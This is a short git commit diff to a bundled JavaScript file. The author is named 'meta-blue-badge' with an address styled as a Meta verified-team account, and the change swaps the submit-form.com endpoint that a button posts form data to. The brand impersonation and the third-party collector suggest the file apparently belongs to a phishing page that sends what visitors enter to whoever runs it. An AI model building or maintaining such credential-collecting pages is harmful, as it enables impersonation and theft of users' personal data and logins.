e30bcba53a053ebc2b4a1556615769a859d1609a
meta-blue-badge <metaverifiedteambadge@gmail.com>
2024-11-26 15:21:22 +0500

    Update main.be179052.js

--- main.be179052.js
+++ main.be179052.js
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/r5uqIEmRD", {
+                        fetch("https://submit-form.com/L2joBfHfp", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
